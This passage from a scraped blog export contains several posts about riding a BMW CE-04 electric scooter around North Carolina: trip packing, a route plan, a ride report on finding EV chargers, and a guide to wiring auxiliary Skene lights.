CE-04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html) and did a range test to see how far I could get on North Carolina rural highways with everything: 62 miles, just as expected. What I packed is a bit different than what I would have packed had I been doing a ride on my GS's of yore:\n\n![](https://i.snap.as/53wlHiTU.jpg)\n\n\u003c!--more--\u003e\n\nHere's what I've packed:\n\n\\- Emergency charging gear: J1772 cable, Jackery 1000 Power bank, adapters (TT30, 30A, 50A, Tesla), charger for Jackery\n\\- Clothes: 2 shirts, 3 socks (1 waterproof), rain jacket, rain pants\n\\- Tools: MotoPumps AirShot, Dynaplug Xtreme, Allen key set, Torx set, Headlamp, multi-tool\n\\- Self-care: water bottle, snacks, toothbrush, deodorant, eye mask, first-aid kit, Garmin Messenger (Satellite tracker)\n\\- Entertainment: MacBook Air, Fuji X100V, Kindle, USB cables\n\nBelieve it or not, this all fits without needing to bring along an ugly top case:\n\n![](https://i.snap.as/VLYGwnD3.jpg)\nI did take the test ride as an opportunity to test the \"Electric Jerry Can\", and it ran fine at 10A. This is my homemade range extender for EVs, built out of a Jackery 1000 battery bank with a ground-free EVSE cable. It’s good for an extra 9% of range should I run into a disabled charger or make a terrible miscalculation:\n\n![](https://i.snap.as/HF5qCF4G.jpg)\n\nKickstands up at 5am tomorrow.","tags":[],"images":["https://i.snap.as/53wlHiTU.jpg","https://i.snap.as/VLYGwnD3.jpg","https://i.snap.as/HF5qCF4G.jpg"],"paid":false,"full_post_url":"","views":82,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"nsr7zw4mtxu50jzu","slug":"in-search-of-native-lands-intro","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-07-12T15:28:38Z","updated":"2023-07-22T15:29:31Z","title":"In Search of Native Lands: Intro","body":"In 42 hours’ time, I'm embarking on a 3-day journey through the center of North Carolina, focusing on places that were important to the Native Americans of this area:\n![](https://i.snap.as/1srrKZIG.jpg)\n \nMy weapon of choice is the BMW CE-04 - an electric two-wheeler, which is why you see charging stops scattered around every 45-60 miles:\n\n\u003c!--more--\u003e\n\n\n![](https://i.snap.as/mSQ0HCWT.jpg) \n\nThe charging stops have been strategically placed in towns I'd like to explore by foot, so expect to see a lot of small-town action. The route is flexible, but planned stops include:\n\n\\- Town Creek Indian Mound\n\\- Hardaway Site\n\\- Morrow Mountain\n\\- Charlotte\n\\- Rutherfordton (overnight)\n\\- Lake Lure\n\\- Chimney Rock\n\\- Little Switzerland\n\\- Catawba Meadows\n\\- Joara Site\n\\- Lenoir\n\\- Hickory (overnight)\n\\- Trading Ford\n\\- Sapona Town Site\n\\- Salisbury\n\\- Lexington\n\\- Kewaunee Site\n\\- Asheboro\n\nAll said and done, the trip should clock in at around 575 miles. My biggest fear for this trip is hitting a deer during one of my early morning departures. The thing I'm most excited about so far is Little Switzerland, just because it's one of the few areas of this state that I have yet to visit.","tags":[],"images":["https://i.snap.as/1srrKZIG.jpg","https://i.snap.as/mSQ0HCWT.jpg"],"paid":false,"full_post_url":"","views":45,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"dg79hk0b5sgguwg1","slug":"piggly-wiggly-saves-the-electric-coastal-raid","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-06-23T14:06:39Z","updated":"2023-06-23T14:54:02Z","title":"Piggly Wiggly saves the Electric Coastal Raid","body":"The birthrights of humankind are that of unexplored limits and undiscovered territories. The aim of my trip last weekend was to find a bit of both.\n\n![](https://i.snap.as/7vuQcwhb.jpg)\n\n\u003c!--more--\u003e\n\nIn the USA, my steed is exotic and likely unfamiliar to most readers: the [BMW CE-04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html). It's an electric scooter with an 8.5 kWh battery, good for about 60 miles of range on country roads. It'll comfortably hit 80 mph – but not without a severe impact on its range. This beemer is a true city slicker and, like the Ivory Billed Woodpecker, is rarely found in the South-Eastern United States.\n\nMy goal is simple: learn how far this scoot can reasonably travel in a day. The nearest beach is a 333-mile round-trip avoiding highways, so I figure that should be a good benchmark to use. This was my plan:\n\n![](https://i.snap.as/MCQQEMtU.png)\n\nDid I mention that this bike requires an hour of charging for every hour of riding you put in?\n\n**The Crack of Fucking Dawn**\n\nI scarf down a bowl of yogurt with some granola and head out to the gravel driveway to hop on my electric steed. Somehow, I've made it this far, and it's only 5:01 am. I'm so excited about this ride that coffee doesn't even cross my mind.\n\n![](https://i.snap.as/sFSsCLsZ.jpg)\n\nI turn on the ignition, and the BMW CE-04 roars to life, or not.. as there are absolutely no moving parts to engage until you pull on the throttle of this electric-motor belt-driven battery-laden spaceship. The BMW Navigation software cheerily announces that I should arrive by 8:45 am, but sadly, it is unaware of the need to make charging stops.\n\nThis is the earliest I've left my house for anything but a group bicycle ride, and the cool weather feels nice against my vented jacket, gloves, and boots. As I wait for a traffic light on the campus of UNC-Chapel Hill (America's Oldest Public University), I see a Gray Fox playfully dancing up and down the street, likely attempting to catch a small rodent that I'm unable to see in the pitch fucking black.\n\nThe first 15 miles of this ride travel through suburban areas (Chapel Hill, Cary, Morrisville, Apex) should know quite well, having lived among them for about 8 years. Winding through the ethereal darkness at 5 am, nothing seems familiar.\n\nDaylight breaks as I cross through Holly Springs, seeing a dot on my map that must mean a charging stop, but I realize I'm saving it for the way back. Instead, we're heading a few miles more to Fuquay Varina. I always assumed this town had a corrupt Native American name, but it resulted from a merger of two towns in the 1960s named after two different immigrants: Fuquay and Varina.\n\n![](https://i.snap.as/f2ehT5xm.jpg)\n\nI like to explore new charging spots when I can, so I first try a charger at City Hall, but it's apparently blocked by a big red gate outside office hours. I updated its entry at PlugShare.com and moved on to the proper charger at the public lot two blocks away. I arrive with 49% battery left (14% more than ABRP's pessimistic calculation), walk around, visit the local historic park, and grab a book at the little library: [\"The Alchemist\" by  Paulo Coelho.](https://www.goodreads.com/en/book/show/18144590)\n\n![](https://i.snap.as/taZQabY0.jpg)\n\nTechnically I don't even need to stop in Fuquay, but I prefer to always have enough juice that I don't get stranded in case the only charger in a town isn't available (that'll come into play later in this story). After 29 minutes of wandering around, I pull the bike off the charger at 77% and head onward.\n\n**Dunn Dah Dunn Dunn**\n\n![](https://i.snap.as/2uNxqTQ6.jpg)\n\nLeaving Fuquay-Varina, wooded suburbia quickly transforms into a quiet pastoral landscape where you can see for miles. Riding along NC Highway 55, I pass through Angier and then Coats, where I find a Cotton Museum that I should drag my mom to the next time she visits.\n\n![](https://i.snap.as/5a0j9gkd.jpg)\n\nLike most EV charging stations, the only charger in Dunn is well-hidden enough to make any Geocacher or ADVrider Tag player excited: it's in an unmarked parking lot, hidden between two dumpsters.\n\n![](https://i.snap.as/TgWAznNj.jpg)\n\nI drop by Sherry's Bakery \u0026 Diner for a breakfast and coffee stop, read some of my book, and then wander around a bit, checking out the wares at the farmers market. After 45 minutes, the CE-04 is at a 97% charge, so I grab one last swig of water from my water bottle and saddle up for a ride to Clinton, NC.\n\n**\"If you live long enough, you'll make mistakes.\"**\n\\- Bill Clinton\n\nThe dull straight highways are killing my vibe, so I change the routing preference in BMW's navigation software from \"Efficient\" to \"Winding\", setting the dial down to 50% so the algorithm doesn't add unnecessary goose chases along the way.\n\n![](https://i.snap.as/WEgCQ7g2.jpg)\n\nIt totally works: this turned out to be my favorite stretch of the ride: dilapidated barns, rough roads, smelly hog farms, loose cows, and curves. The sky is hazy from the smoke of distant wildfires.\n\n![](https://i.snap.as/tRGGLWcg.jpg)\n\nThe loose bull did freak me out a bit - while I've hung out with cows on a farm, I've never been stared down by one on the road. He stared intently at me the entire time as I gave it as wide of a berth as possible without going offroad.\n\n![](https://i.snap.as/MMHFiS6F.jpg)\n\nNot long afterward, I spy a dip in the pavement, and as I am about to hit it, I spy orange tape alongside it. THWACK! My shocks bottom out, causing the scoot to bounce violently though without any loss of control. That's only the 3rd time in 3,300 miles of riding this bike that it's happened to me. I think to myself, \"I hope those Skenes didn't fall off,\" and move on, wishing for a brief moment that I still had that GS, until I get to a stop sign and again feel the rush of the instant torque electric motor.\n\nWhile making trip plans the other night, I found an [unreviewed charger listed at Deacon Jones Toyota ](https://driver.chargepoint.com/stations/12974851)that wasn't listed elsewhere. It's along the way and has a higher kilowatt rating than the other charger I had in my plans, so I circle around the parking lot to confirm its existence and find nothing. I suspect it was inside the service area, but I have never seen that before.\n\n![](https://i.snap.as/gzoR0vB1.jpg)\n\nNot feeling dejected, I head on to Nissan of Clinton, where I arrive with 28% state-of-charge and find that this charger is now under lock \u0026 key. I look back at the reviews on PlugShare, and see that the last review had noted, \"It looked like the power was turned off.\". This kind of comment usually means you need to hit a reset button or flip a power switch, so I thought nothing of it.\n\nI walk back toward my bike and audibly scream \"FUUCCCKKKK\" into my helmet: not because of the lockout, but because I realize that my 3rd backup charging was no longer available. The bag I had attached to the back of the bike containing an emergency J1772 EV charger cable was no longer there. The ROK straps dangled impotently, still clipped as if nothing had happened. Thinking back, I recall playing a little fast and loose with the straps when I squeezed the water bottle back into the bag in Dunn.\n\nA lovely employee at the dealership, Ryan, walks by, gawks at the bike for a moment, and asks if it's an electric bike. I confirm and then ask if it's possible to reactivate the charger. He calls up the GM, who drops by looking a bit grumpy and confirms that this charger is no longer available. He was sick of people coming by for a free charge, so they disabled this charger when they installed the new one for their use only. He doesn't seem to be an EV guy, so I don't get into the whole AC vs DC issue. He directs me to a new charger recently installed by Duke Energy a couple of miles away.\n\n![](https://i.snap.as/xmW2srQZ.jpg)\n\nRyan shows off Nissan's latest electric car, the [Ariya](https://www.nissanusa.com/vehicles/electric-cars/ariya.html), before I head to the new charger. I've got 22 miles of range, so I'm not worried. I recalled that Ryan was good enough to suggest that I double-check the charger before going out of my way to it, so I pulled over after a mile and did so: it was a good call, as this new charger is also DC, and the BMW CE-04 is only compatible with the slower and cheaper AC-based chargers.\n\nWith 3 charging options out of the picture, I researched other charging options within 20 miles and found a charger listed at the Piggly Wiggly in Warsaw, about 14 miles from here. I'm extremely concerned at the prospect of running out of charge, so I baby the throttle and ride just below the speed limit on Highway 24. The local truckers behind me are not amused with my life choices, honking at me when I pull out to let them pass.\n\n**Saved by the Piggly Wiggly**\n\nUnlike other EV charging spots, you can spot a Piggly Wiggly from a mile away. About a year ago, Piggly Wiggly started adding EV chargers to their grocery stores and accidentally built the most robust EV charging corridor in the southern part of the state.\n\n![](https://i.snap.as/GrAbvsMU.jpg)\n\nI arrive at the charger with 11% charge left - low enough that if it's broken, my backup plan is either a tow truck or asking my wife to drive 2 hours to rescue me. While this charger requires the Shell Recharge app, so did the one in Fuquay, so it was easy to get started.\n\nWith my water bottle missing and a need to urinate, I head into this monument of the modern supply chain and look for a restroom. I can't find one so I head across the street to the gas station, where I deposit liquid and purchase its replacement.\n\nLike most towns that spring up suddenly in response to a railway or highway - Warsaw doesn't have much of a downtown. It does have some neat old buildings, though, for instance, this house that is now the [Duplin County Veterans Museum](https://www.visitnc.com/listing/yztB/duplin-county-veterans-museum):\n\n![](https://i.snap.as/5mRL3gb1.jpg)\n\nWarsaw also boasts an unusually high police presence: more akin to Beijing or Cary than any town of 2700 denizens ought to be. Two officers and two different sets of locals ask naive questions about the bike. One of the locals remarked, \"I can tell you ain't from around here. No one here has weird things\". Everyone is shocked at the $14k sticker price and 80mph top speed but similarly disappointed by the 60-mile range.\n\n**Wallace \u0026 The Winery of the South**\n\nMy riding plan is wholly shot at this point; with no feasible way to ride US-421 south to Burgaw due to a lack of working EV chargers along the way, I head directly toward Wallace via Hwy 117.\n\n![](https://i.snap.as/uewuwwM9.jpg)\n\nI soon make it to Rose Hill, where I spy my favorite winery in the Southeast: Duplin, which specializes in muscadine-based sweet wines. Don't come here expecting fancy, though. Duplin makes the sort of wine you break out at a BBQ beach party rather than a wedding. Most of it is too sweet for words, but as a card-carrying member of their wine club, I can assure you that their  Mothervine Wine is divine.\n\nI'm already running behind schedule due to the Clinton charging debacle, so I don't bother to drop in, and instead make my way along the railroad tracks to the next Piggly Wiggly in Wallace.\n\nThere isn't much to write about Wallace, so I won't.\n\n**Out in the country, but the blueberry still connect**\n\\- Jay Z (sorta)\n\nI continue pushing the scoot further down the line and find myself surrounded by cyclists on a group ride. June is typically when I would be doing 500-mile bicycle rides across California, so the sight makes me a little homesick.\n\n![](https://i.snap.as/cYYVz3Vi.jpg)\n\nBefore buying this scoot, cycling was the main way I got around. I don't feel as safe as a human-powered vehicle in North Carolina due to the lack of inclusive traffic engineering practices, so I bought a scooter. Somehow the scoot feels safer, but deep down inside, I know that cyclists live longer lives due to their healthier lifestyle, even if they are more vulnerable on the road.\n\nMy final charger before the beach is in Burgaw. Signs along the way inform me that Burgaw is the home of the [North Carolina Blueberry Festival](http://ncblueberryfestival.com/), which sounds like a riot. This weekend, of all weekends, is that festival, and my charger is in the middle of its parking area.\n\n![](https://i.snap.as/5LIHYY9y.jpg)\n\nI'm a patient guy, so I don't mind the slow traffic, even if I'm baking in my Klim gear. I arrive at the Piggly Wiggly with 33% battery life, park in its dedicated EV spots, and plug the bike in.\n\n![](https://i.snap.as/vjINAXsW.jpg)\n\nUnlike most chargers, Shell Recharge stations require you to scan in a QR code or type in a station ID. I try the QR method, and the Shell Recharge app reports \"No Stations Found\". What in the actual fuck? I try typing it in and try the other port and run into the same problem. I try using other functions in the Shell app and see what seems to be connectivity errors. I spot a Verizon mobile cellular tower truck at the other end of the parking lot and make the connection to what's going wrong: the NC Blueberry Festival is so jam-packed with cellphone users that T-Mobile doesn't have the bandwidth to make outgoing connections.\n\nThe Shell Recharge app apparently requires a working data connection on your cellphone. After pissing in the store's restrooms, I decide that I will make this work instead of going across town to another charger. The plan was to find an open WiFi network somewhere in town, start the charge there, and then walk to my bike.\n\nI'll cut the story short here, but that little maneuver cost me 30 minutes.\n\n**Wrightsville Beach**\n\nIf getting out of Burgaw was like wandering through a morass, than riding through Wrightsville Beach was like entering a minefield blindfolded. I acknowledge that I am traffic, but the road engineers here should be shot, have their fingernails plucked out by a sugar-fueled toddler, and then quartered.\n\nI am glad that the Town placed its chargers a 20-minute walk from the beach because that's about as much as I was willing to suffer on the road anyways. The charger here was particularly busy, likely because every other parking space for miles around was already taken by fellow beach-goers.\n\n![](https://i.snap.as/6DkplLhE.jpg)\n\nBy this point, I'm thirsty as fuck, and I head toward the restrooms hoping to find a water fountain. The only option was a water bottle filler; mine was lost a few hours back. I see a discarded disposable water bottle on the ground with a cap, grab it, and fill it up, hoping the previous user didn't have Herpes or some other communicable disease.\n\nI then walk to the beach, absolutely baking in my Klim Marrakesh pants. In retrospect, I should have changed into my swim trunks, but my brain kept telling me: \"You are already two hours late, ain't nobody got time for a swim\".\n\n![](https://i.snap.as/1lOvoNZT.jpg)\n\nThe beach was absolutely jam-packed - I grabbed a selfie, returned to the bike, and left Wrightsville Beach. I had planned on charging the scoot to 97%, but not wanting to further tie up the last parking spot, I decided to head out and top off at the Cape Fear Community College North Campus.\n\n**Going Backwards to Go Forwards**\n\nThe community college has something going for it that Wrightsville Beach had little of: shade. I pull into the lot with a 69% charge, grab a book, and duck under a tree for a few minutes. I knew after this, I was going to have to head back on the same route that I came in on, which is generally against my own rules, but the only alternatives are going to cost me an extra 30 minutes, which isn't ideal as I'm already two hours late.\n\n![](https://i.snap.as/8w6knPYu.jpg)\n\nAfter 15 minutes, I'm back up to 89% and ready to head back to Rose Hill. I missed the World's Largest Frying Pan on the way down, so I'm happy to be back here to bathe in its awesome power:\n\n![](https://i.snap.as/tRV2BdFh.jpg)\n\nThe frying pan is, in fact, quite large, but it is also weird looking and underwhelming. I stop by the nearby charger run by the local power coop, where I stumble into some people charging an EV for the first time. They are confused as to why the Chevy Bolt EV they are borrowing is charging so slowly. I explain the AC vs DC difference, directing them to a faster DC station 4 miles away. I ruminate on how complicated EV charging is, even compared to the diesel vs leaded vs unleaded vs ethanol-free fuel arguments, and then read more of my book.\n\n![](https://i.snap.as/Z6XXyC97.jpg)\n\nKnowing that charging alternatives become limited after this point, I make the call to top off at the Warsaw Piggly Wiggly again 15 miles north of here, just in case my planned stop in Newton Grove is a bust.\n\n**Refueling at Smithfields Chicken 'N BBQ**\n\nAs I head north, I'm keenly aware that it's becoming prime deer hour. As I see one dash across the highway 300 yards ahead of me, I patiently await others to join in, but nothing other than a stray hawk or owl crosses my path again.\n\n![](https://i.snap.as/z5w7SMga.jpg)\n\nSimilar to Piggly Wiggly, the restaurant chain [Smithfields Chicken 'N BBQ](https://www.scnbnc.com/) has also chosen to become a critical partner in North Carolina's EV infrastructure. Their chargers use a Tesla-specific plug (now known as \"[NACS](https://www.tesla.com/blog/opening-north-american-charging-standard)\"), but I keep a [TeslaTap min](https://www.umc-j1772.com/index.php?route=product/product\u0026product_id=146)i J1772 adapter stowed away so that I'm able to charge here as well.\n\n![](https://i.snap.as/mLztPCyH.jpg)\n\nThis adapter does not suddenly make Tesla Superchargers work with the CE-04, as they are the faster DC standard. It'd be nice if it did, as they charge 35X faster than I can over AC.\n\n![](https://i.snap.as/6V3v5Ago.jpg)\n\nI haven't had a proper meal all day, so even as a pescatarian, Smithfield's BBQ sandwich is just the thing for me today. Out of necessity, I've had to become more of a flexitarian than a pescatarian since moving back to NC a year ago.\n\nI take my time: eating, reading, and relaxing for 53 minutes until the bike is up to 96% - more than enough to make it to Holly Springs without range anxiety. Like a cellphone, the closer you get to 100%, the slower it charges, which is why I part of why I opt for shorter stops more often.\n\n**Stabbing Westward**\n\nI didn't leave the restaurant until 8pm, so at this point, I am chasing the dying embers of the sun as I make my way home.\n\n![](https://i.snap.as/nkO3QGQy.jpg)\n\nHighway 50 is wonderfully quiet, idyllic, and filled with cornfields as far as the eye can see. I like it here.\n\n![](https://i.snap.as/9aXM9LZT.jpg)\n\nI pass through Coats and Angier again, but this time make a quick photo stop at [Sunni Skies Homemade Ice Cream](https://www.sunniskys.com/). This is the closest North Carolina has to a \"famous\" ice cream shop, with 130+ flavors and numerous appearances on TV shows. Two of their flavors, \"Exit Wound\" and \"Cold Sweat\" are so spicy that they require you to sign a waiver. While it sounds enticing, I'm feeling done and decide to push hard to see if I can make it home by 11.\n\n**Having a Holly Jolly Time**\n\nI arrive in Holly Springs in the dark, with 22% battery, and without fanfare. I am gobsmacked to see that this town has an actual nightlife in 2023, with bars and fancy restaurants with patios. When I lived here 20 years ago, the after-hours activity of choice was the Sonic Drive-Thru and the nearby Walmart.\n\n![](https://i.snap.as/55Ui5a93.jpg)\n\nThe charger parking at the Holly Springs Town Hall is weird: there are two charger ports and one EV space jammed up to the handicapped parking. While chances are slim that I would get a ticket for parking in the handicapped spot as it's the only place most vehicles can access the second port from, I'm on a bike - so I just park behind on the sidewalk, risking a more exotic citation.\n\nI charge up to 65% - just enough to make it home with a large margin of error. Then, I meander back through the suburban maze of the triangle. Coming back in the other direction, other than the street names, the roads don't seem any more recognizable in the dark than the mystery they were before.\n\nAt this hour, my main concern is drunk and distracted drivers rather than deer, but there is no drama today. I arrive home in Chapel Hill at 10:41pm with a 22% charge. Oddly enough, I'm not tired at all – likely because I’ve been sitting on a  grin-inducing adrenaline machine for most of the day.\n\n![](https://i.snap.as/c3SWQDUz.jpg)\n\n**The  Numbers**\n\n* 333 miles\n* 17 hours and 40 minutes\n* 11 charges\n* 1 lost bag\n\nAs far as determining the daily travel limits of the CE-04, here are my new thoughts:\n\n* 250 miles (400km): easily accomplished with the right infrastructure\n* 350 miles (560km): requires planning and luck.\n* 500 miles (800km): the practical upper limit for a full 24-hour day.\n\n**In closing**\n\nThis trip had a bit of everything central to the modern EV charging experience in America:\n\n* Missing chargers\n* Unavailable chargers\n* Incompatible chargers\n* Overall confusion over technology\n* Lack of signage\n* Awkward parking arrangements\n* Misbehaving charging apps\n\nIf you are riding around in a Tesla with 300+ miles of range and automated navigation to a well-maintained charging network, it's easy to be oblivious to how difficult long-distance travel is for other EV users.\n\nAs much as I love the CE-04, I came away from this day more convinced than ever that any EV without support for DC fast charging is an evolutionary dead-end. I'm eager to see what [Fuell](https://www.fuell.us/products/fuell-fllow-e-motorcycle), [Energica](https://www.energicamotor.com/us/), [Livewire](https://www.livewire.com/), and other forward-thinking manufacturers do in the near future.\n\nI suspect that 10 years from now, this ride report will look as antiquated as reports from 1920 look to us today.","tags":[],"images":["https://i.snap.as/7vuQcwhb.jpg","https://i.snap.as/MCQQEMtU.png","https://i.snap.as/sFSsCLsZ.jpg","https://i.snap.as/f2ehT5xm.jpg","https://i.snap.as/taZQabY0.jpg","https://i.snap.as/2uNxqTQ6.jpg","https://i.snap.as/5a0j9gkd.jpg","https://i.snap.as/TgWAznNj.jpg","https://i.snap.as/WEgCQ7g2.jpg","https://i.snap.as/tRGGLWcg.jpg","https://i.snap.as/MMHFiS6F.jpg","https://i.snap.as/gzoR0vB1.jpg","https://i.snap.as/xmW2srQZ.jpg","https://i.snap.as/GrAbvsMU.jpg","https://i.snap.as/5mRL3gb1.jpg","https://i.snap.as/uewuwwM9.jpg","https://i.snap.as/cYYVz3Vi.jpg","https://i.snap.as/5LIHYY9y.jpg","https://i.snap.as/vjINAXsW.jpg","https://i.snap.as/6DkplLhE.jpg","https://i.snap.as/1lOvoNZT.jpg","https://i.snap.as/8w6knPYu.jpg","https://i.snap.as/tRV2BdFh.jpg","https://i.snap.as/Z6XXyC97.jpg","https://i.snap.as/z5w7SMga.jpg","https://i.snap.as/mLztPCyH.jpg","https://i.snap.as/6V3v5Ago.jpg","https://i.snap.as/nkO3QGQy.jpg","https://i.snap.as/9aXM9LZT.jpg","https://i.snap.as/55Ui5a93.jpg","https://i.snap.as/c3SWQDUz.jpg"],"paid":false,"full_post_url":"","views":186,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"0l080j8da4r4f4i9","slug":"skene-lights-installation-on-the-bmw-ce-04","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-06-14T01:37:44Z","updated":"2023-06-16T19:51:11Z","title":"Skene Lights Installation on the BMW CE-04","body":"Before allowing my kids to ride on the back of my BMW CE 04, I wanted to drastically improve its visibility. It turns out that there is a company that specializes in doing just that: [skenelights.com](https://skenelights.com/)\n\nThe lights they sell have a unique conspicuity filter, which uses the motion-detecting characteristics of human vision to enhance visibility. It's difficult to accurately capture the appearance with a cell phone camera due to the rolling shutter, but this is what it looks like before sunset and at night:\n\nhttps://youtu.be/1ggsJFvgzgc\n\n\u003c!--more--\u003e\n\nThese lights can also work as an extra set of blinkers, and in the case of the rear lights, they will also light up if I hit the brakes or through deceleration if I even just let off the throttle.\n\nThe biggest problem with installing 3rd party lights is knowing how and where to plug them in. As BMW has chosen not to publish an electrical diagram, it took me a full day to figure it out. This was my first time using Posi-Tap connectors, which was easier than I thought: after watching a [Posi-Tap install video](https://www.youtube.com/watch?v=5v0Sv1LVMo4), I only had one wire that required multiple taps: the 12V+ lead on the license plate light.\n\nThis guide is meant to capitalize on my misery and for your use as a time-saving CE-04-specific supplement to the [official Skene installation guides](https://skenelights.com/support.html). Now, let’s go take things apart!\n\n![](https://i.snap.as/ucmfIMdD.jpg)\n\n---\n\n## Photon Blaster-TS Front Lights Installation\n\n* **Time**: 2 hours if this is your first time installing lights\n* **Tools**: T30 wrench, T25 wrench\n* **Suggested wiring:**\n  * Switched +12V -\u003e Green alarm wire\n  * Ground -\u003e Brown alarm wire\n  * Left Turn Signal -\u003e Red left turn signal wire\n  * Right Turn Signal -\u003e Red right turn signal wire\n\n### 1. Remove the front panel\n\nThe front panel on the CE-04 slides down - no tools required.\n\n![](https://i.snap.as/7hYeyHHs.jpg)\n\nUnderneath this panel are the headlight adjusters, an emergency T25 wrench, and an ODB-II port.\n\n### 2. Remove the windscreen.\n\nThis is held by 4 T25 screws. If you have the high windscreen, you may have more screws than this, but you only need to remove the bottom 4 for this project.\n\n### 3. Remove the relay and indicator panel\n\nThere are 4 T30 screws underneath the windscreen and behind the display.\n\n![](https://i.snap.as/JT537emH.jpg)\n\nOnce unscrewed, you can access all the wires you need to install auxiliary lights for the BMW CE 04. First, we are going to use the alarm for 12V switched power and ground - highlighted below:\n\n![](https://i.snap.as/rEZK5Kxj.jpg)\n\n### 4. Tap the alarm connector\n\nI don't have an alarm, so my scooter came with this 120-ohm resistor (BMW part 7668405 01) installed. Either way, the idea is the same: install the larger blue Posi-Tap's on the brown (ground) and green (12V switched power) wires.\n\n![](https://i.snap.as/rRDvVdux.jpg)\n\nOnce you've done that, connect the wires up to your Photon Blasters and power up the CE 04 to confirm basic operations:\n\n![](https://i.snap.as/2v8k8JR6.jpg)\n\nIf your taps were successful, the lights should now work when you turn your scooter on. If not, check that you successfully pierced the cable, as it is easy to miss the center of the plug you are tapping into - DAMHIK.\n\n### 5. Tap the turn signals\n\nIf you have the turn-signal variety of the Photon Blasters (-TS suffix), tap into the red wires on the turn signal cables too. Thankfully they are straightforward to access:\n\n![](https://i.snap.as/eP43KGBJ.jpg)\n\n### 6. Secure the controller\n\nTry your turn signals, and if they work, you can move on to placing the velcro for the controller on the flat area between the alarm and the screen:\n\n![](https://i.snap.as/N04Wc3lh.jpg)\n\n### 7. Route the LED cables\n\nBefore you clean up your cable mess, I suggest screwing the Skene lights into their eventual home at the bottom of the wheels. You can drape them across the front of the fairing on either side. I experimented with several ideas, such as removing the panels and using the gaps between them, but in the end, I went with a simple approach (no additional unscrewing required):\n\n![](https://i.snap.as/SE963ky0.jpg)\n\nThe installation guide suggests a drip loop so water does not drip down the cable and into the lights.\n\n![](https://i.snap.as/N96XQQ0V.jpg)\n\nI found that introducing this bend into the cable revealed wires on the right side light, so I added some reinforcement electrical tape to protect it:\n\n![](https://i.snap.as/n1kKL9fj.jpg)\n\nI routed the cable up the fork protector and added a zip tie to the fork boots to make sure that the cable didn't pop out from behind the protector:\n\n![](https://i.snap.as/k2H9Zz5t.jpg)\n\nNow get the bike on the center stand, and push the wheel full lock in either direction to ensure that the wires are not run so tightly that they interfere with steering.\n\n![](https://i.snap.as/NSxFDObr.jpg)\n\n### 8. Clean up\n\nThen go ahead and wrap all of your connectors with electrical tape and use every twist tie you can to make things look nice. Here is what things looked like under the hood for me before I put the panels back on:\n\n![](https://i.snap.as/qhqYV6JO.jpg)\n\nI was able to hide all of the wires beneath the turn signal panel so that you couldn't even tell that evil things had been done below:\n\n![](https://i.snap.as/FqBiZ46x.jpg)\n\nNow slide the front panel back into place, put the screen on, and level out the LEDs. If your lights aren't pulsing, you may need to enable the conspicuity mode - see the manual for programming notes.\n\n---\n\n## P3 Rear Lights (IQ-260 Series) Installation\n\n* **Time**: 2 hours\n* **Tools**: T25 wrench, multi-tool, scissors\n* **Suggested wiring:**\n  * Switched +12V -\u003e white/grey wire to the license plate light\n  * Ground -\u003e brown wire to the license plate light\n  * Left Turn Signal -\u003e white wire to the indicator cluster\n  * Right Turn Signal -\u003e blue/green wire to the indicator cluster\n  * Brake - one of the two lavender/red wires to the indicator cluster\n\nOn the CE-04, the rear lights are more challenging to install than the front lights. Having removed the rear wheel before to replace a broken indicator light, I opted to write up installation instructions that do not require wheel removal - even if doing so does provide a slightly cleaner install.\n\n### 1. Remove panels\n\nFirst, remove the 3 T25 bolts holding the belt cover. The arrow points to where we will be tapping the wires:\n\n![](https://i.snap.as/XIqfSeOt.jpg)\n\nRemove the white panels on both sides for more room - both have one T25 bolt to remove before you can pull them out.\n\n![](https://i.snap.as/luEZFie5.jpg)\n\n### 2. Tap the power leads\n\nYou will need to strip the fabric from two cables: the 2-wire license plate light cable with a quick connector and a 6-wire indicator cluster cable. I suggest carefully removing the license plate light cable using the quick connector and a small flat-head screwdriver for easier access.\n\n![](https://i.snap.as/atm4pXNX.jpg)\n\nIf you end up breaking the safety latch on it, no big deal - I broke mine on the second go around. Once detected, install PosiTaps on these two wires for the ground (brown) and 12V switched power (silver/black).\n\nOnce you do this, perform a power-on test of the lights.\n\n### 3. Tap the signal leads\n\nThe 6-wire indicator cluster cable is behind the license plate light and is slightly more difficult to unwrap. I used a small pocket knife and pair of scissors to cut into the section where the thick translucent plastic protector part ends, careful not to cut into the wires:\n\n![](https://i.snap.as/NScDC402.jpg)\n\nYou'll need to install Posi-Taps onto the white wire (left turn signal), blue/green wire (right turn signal), and one of the lavender/red wires (brake). The result looks somewhat like a rainbow snake exploded:\n\n![](https://i.snap.as/trQeMOuO.jpg)\n\n### 4. Wrap the taps\n\nI wrapped the cables up in electrical tape (I regret using purple), and then removed the back panel (T25 screws) to cleverly hide the tapped cables and route the controller to its final resting space above the 12V battery.\n\n![](https://i.snap.as/hfi5eK6M.jpg)\n\n### 5. Secure the controller\n\nI could have hidden the controller below, but since I had the decelerometer version, I needed a level surface, so I chose the space just above the 12V battery.\n\n![](https://i.snap.as/bxOyzqIY.jpg)\n\nAs the manual suggested, I installed a zip tie to the cables, and then I used some duct tape to keep it from rattling around.\n\n### 6. Route the LED cables\n\nOnce I knew how long I needed the wires to run, I installed the rear lights, running the wires beneath the swing arm until they could join the standard indicator wires. If 